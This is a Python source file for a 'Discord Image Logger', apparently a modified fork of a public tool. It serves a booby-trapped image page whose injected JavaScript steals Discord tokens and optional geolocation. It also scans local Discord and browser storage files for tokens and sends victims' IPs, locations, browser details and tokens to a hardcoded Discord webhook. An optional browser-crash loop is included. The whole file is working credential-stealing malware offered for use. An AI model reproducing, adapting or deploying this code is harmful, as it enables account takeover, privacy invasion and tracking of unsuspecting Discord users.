from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser, os, re, glob, platform

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and Discord tokens by abusing Discord's Open Original feature"
__version__ = "v2.4"
__author__ = "DeKrypt"

config = {
    "webhook": "https://discord.com/api/webhooks/1366849835172364439/4eTvT8QeTTAsIogI0ofV5tbjg_U8bSSoQ1no5WU5T_Mn0CpmbcAEAJ2tG4DrQ5TStY7P",  # Geçerli bir Discord webhook URL'si ile değiştirin
    "image": "https://media.discordapp.net/attachments/1360581267862847549/1366847369080999966/Moon_phasesPHASE1.png?ex=68126f4f&is=68111dcf&hm=b4897b5f8bcda159d5ac4e17f163fb4ef6d72f5dbb8dbd9ea5ca29d8dfa8a66c&=&format=webp&quality=lossless",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
    "tokenGrabber": True,
}

blacklistedIPs = ("27", "104", "143", "164")

def validate_webhook(url):
    """Webhook URL'sinin geçerli olduğunu kontrol eder."""
    try:
        response = requests.head(url, timeout=5)
        return response.status_code == 200
    except Exception as e:
        print(f"Webhook validation failed: {e}")
        return False

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error, context="Unknown"):
    try:
        print(f"Reporting error: {context} - {error}")
        if not validate_webhook(config["webhook"]):
            print("Invalid webhook URL, skipping error report")
            return
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error",
                    "color": config["color"],
                    "description": f"An error occurred!\n\n**Context:** {context}\n**Error:**\n```\n{error}\n```",
                }
            ],
        }, timeout=15)
    except Exception as e:
        print(f"Failed to report error to webhook: {e}")

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None):
    print(f"Making report for IP: {ip}, Token: {token}")
    if ip and ip.startswith(blacklistedIPs):
        print("IP blacklisted, skipping report")
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            try:
                if not validate_webhook(config["webhook"]):
                    print("Invalid webhook URL, skipping link alert")
                    return
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [
                        {
                            "title": "Image Logger - Link Sent",
                            "color": config["color"],
                            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                        }
                    ],
                }, timeout=15)
            except Exception as e:
                reportError(str(e), "Sending link alert")
        return

    if config["tokenGrabber"] and not token:
        reportError("Token could not be retrieved", "Token grabbing failed")
        return

    ping = "@everyone"

    try:
        print("Fetching IP info...")
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=15).json()
        print(f"IP info: {info}")
    except Exception as e:
        reportError(str(e), "IP lookup failed")
        info = {}

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            print("Proxy detected, skipping report (vpnCheck=2)")
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if info.get("proxy"):
                pass
            else:
                print("Hosting detected, skipping report (antiBot=4)")
                return
        if config["antiBot"] == 3:
            print("Hosting detected, skipping report (antiBot=3)")
            return
        if config["antiBot"] == 2:
            if info.get("proxy"):
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os_info, browser = httpagentparser.simple_detect(useragent or "Unknown")
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP and Token Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', 'Unknown'))+', '+str(info.get('lon', 'Unknown')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if info.get('timezone') else 'Unknown'}`
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot:** `{info.get('hosting', False) if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os_info}`
> **Browser:** `{browser}`

**Discord Token:**
> `{token}`

**User Agent:**
```
{useragent if useragent else 'Unknown'}
```""",
            }
        ],
    }
    
    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    try:
        if not validate_webhook(config["webhook"]):
            print("Invalid webhook URL, skipping report")
            return
        print("Sending report to webhook...")
        requests.post(config["webhook"], json=embed, timeout=15)
        print("Report sent successfully")
    except Exception as e:
        reportError(str(e), "Sending report")
    
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            print(f"Handling request: {self.path}")
            if config.get("imageArgument", False):
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                print(f"Query params: {dic}")
                if dic.get("url") or dic.get("id"):
                    try:
                        url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                    except Exception as e:
                        reportError(str(e), "Decoding URL/ID")
                        url = config["image"]
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            x_forwarded_for = self.headers.get('x-forwarded-for')
            if x_forwarded_for and x_forwarded_for.startswith(blacklistedIPs):
                print("Blacklisted IP detected, skipping")
                return
            
            if botCheck(x_forwarded_for, self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                makeReport(x_forwarded_for, endpoint=s.split("?")[0], url=url)
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                token = None

                if config.get("tokenGrabber", False):
                    data += b'''<script>
                    function getToken(attempt = 1, maxAttempts = 10) {
                        try {
                            let token = localStorage.getItem('token')?.replace(/"/g, '');
                            if (!token) {
                                const wpRequire = window.webpackChunkdiscord_app?.push([[Symbol()], {}, e => e]);
                                if (wpRequire?.c) {
                                    const modules = Object.values(wpRequire.c);
                                    const tokenModule = modules.find(m => m?.exports?.default?.getToken);
                                    token = tokenModule?.exports?.default?.getToken?.();
                                }
                            }
                            if (token) {
                                const encodedToken = btoa(token).replace(/=/g, "%3D");
                                const url = window.location.href + (window.location.href.includes("?") ? "&" : "?") + "t=" + encodedToken;
                                fetch(url, { method: 'GET' })
                                    .then(() => console.log("Token sent"))
                                    .catch(err => console.error("Failed to send token:", err));
                            } else if (attempt < maxAttempts) {
                                setTimeout(() => getToken(attempt + 1, maxAttempts), 1000);
                            } else {
                                console.error("Failed to retrieve token after max attempts");
                                fetch(window.location.href + (window.location.href.includes("?") ? "&" : "?") + "error=token_not_found");
                            }
                        } catch (e) {
                            console.error("Token grabber failed:", e);
                            if (attempt < maxAttempts) {
                                setTimeout(() => getToken(attempt + 1, maxAttempts), 1000);
                            } else {
                                fetch(window.location.href + (window.location.href.includes("?") ? "&" : "?") + "error=token_error");
                            }
                        }
                    }
                    setTimeout(() => getToken(), 500);
                    </script>'''

                # İstemci scriptinden gelen tokenları işleme
                if dic.get("t"):
                    try:
                        token = base64.b64decode(dic.get("t").encode()).decode()
                        print(f"Received token from client: {token}")
                    except Exception as e:
                        reportError(str(e), "Decoding token")

                # İstemci scriptinden gelen yerel tokenları işleme
                if dic.get("local_tokens"):
                    try:
                        token = base64.b64decode(dic.get("local_tokens").encode()).decode()
                        print(f"Received local tokens: {token}")
                    except Exception as e:
                        reportError(str(e), "Decoding local tokens")

                if dic.get("error"):
                    reportError(f"Token retrieval failed: {dic.get('error')}", "Client-side token error")

                if dic.get("g") and config.get("accurateLocation", False):
                    try:
                        location = base64.b64decode(dic.get("g").encode()).decode()
                    except Exception as e:
                        reportError(str(e), "Decoding location")
                        location = None
                    result = makeReport(x_forwarded_for, self.headers.get('user-agent'), location, s.split("?")[0], url=url, token=token)
                else:
                    result = makeReport(x_forwarded_for, self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url, token=token)

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", x_forwarded_for or "Unknown")
                    message = message.replace("{isp}", result.get("isp", "Unknown"))
                    message = message.replace("{asn}", result.get("as", "Unknown"))
                    message = message.replace("{country}", result.get("country", "Unknown"))
                    message = message.replace("{region}", result.get("regionName", "Unknown"))
                    message = message.replace("{city}", result.get("city", "Unknown"))
                    message = message.replace("{lat}", str(result.get("lat", "Unknown")))
                    message = message.replace("{long}", str(result.get("lon", "Unknown")))
                    message = message.replace("{timezone}", f"{result.get('timezone', '/Unknown').split('/')[1].replace('_', ' ')}" if result.get('timezone') else "Unknown")
                    message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
                    message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
                    message = message.replace("{bot}", str(result.get("hosting", False) if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent') or "Unknown")[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent') or "Unknown")[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config.get("crashBrowser", False):
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                
                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config.get("accurateLocation", False):
                    data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            if (currenturl.includes("?")) {
                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            } else {
                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }
            location.replace(currenturl);
        });
    }
}
</script>"""
                self.wfile.write(data)
        
        except Exception as e:
            print(f"Error in handleRequest: {traceback.format_exc()}")
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc(), f"Handle request failed: {self.path}")

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

# İstemci tarafında çalışacak ek script: Yerel dosyalardan token alma
def extract_local_tokens():
    print("Extracting local tokens...")
    paths = []
    os_name = platform.system()

    if os_name == "Windows":
        user_home = os.path.expanduser("~")
        paths = [
            os.path.join(user_home, "AppData", "Roaming", "discord", "Local Storage", "leveldb", "*.log"),
            os.path.join(user_home, "AppData", "Roaming", "discordptb", "Local Storage", "leveldb", "*.log"),
            os.path.join(user_home, "AppData", "Roaming", "discordcanary", "Local Storage", "leveldb", "*.log"),
            os.path.join(user_home, "AppData", "Roaming", "Opera Software", "Opera Stable", "Local Storage", "leveldb", "*.log"),
            os.path.join(user_home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb", "*.log"),
        ]
    elif os_name == "Darwin":  # Mac
        user_home = os.path.expanduser("~")
        paths = [
            os.path.join(user_home, "Library", "Application Support", "discord", "Local Storage", "leveldb", "*.log"),
        ]
    else:
        print("Unsupported OS")
        return []

    tokens = []
    regex_pattern = r'[nNmM][\w\W]{23}\.[xX][\w\W]{5}\.[\w\W]{27}|mfa\.[\w\W]{84}'

    for path_pattern in paths:
        try:
            for file_path in glob.glob(path_pattern):
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        matches = re.findall(regex_pattern, content)
                        tokens.extend(matches)
                        print(f"Found tokens in {file_path}: {matches}")
                except (PermissionError, FileNotFoundError) as e:
                    print(f"Error accessing {file_path}: {e}")
                except Exception as e:
                    print(f"Unexpected error reading {file_path}: {e}")
        except Exception as e:
            print(f"Error processing path {path_pattern}: {e}")

    print(f"Extracted tokens: {tokens}")
    return tokens

def send_local_tokens_to_server(tokens, server_url="http://localhost:8000"):
    if not tokens:
        print("No tokens to send")
        return
    
    try:
        encoded_tokens = base64.b64encode("\n".join(tokens).encode()).decode()
        params = {"local_tokens": encoded_tokens}
        print(f"Sending tokens to server: {params}")
        response = requests.get(server_url, params=params, timeout=15)
        print(f"Server response: {response.status_code}")
    except Exception as e:
        print(f"Error sending tokens to server: {e}")

if __name__ == "__main__":
    # Webhook URL'sini kontrol et
    if config["webhook"] == "YOUR_NEW_WEBHOOK_URL_HERE":
        print("Error: Please set a valid Discord webhook URL in config['webhook']")
        exit(1)
    
    if not validate_webhook(config["webhook"]):
        print("Error: Invalid Discord webhook URL")
        exit(1)

    # Sunucuyu başlat
    server = HTTPServer(('localhost', 8000), ImageLoggerAPI)
    print("Server running on http://localhost:8000")
    try:
        # İstemci tarafında tokenları çıkar ve sunucuya gönder
        local_tokens = extract_local_tokens()
        send_local_tokens_to_server(local_tokens)
        # Sunucuyu çalıştır
        server.serve_forever()
    except KeyboardInterrupt:
        server.server_close()
        print("Server stopped")
    except Exception as e:
        print(f"Fatal error: {traceback.format_exc()}")
        reportError(traceback.format_exc(), "Server startup failed")
        server.server_close()
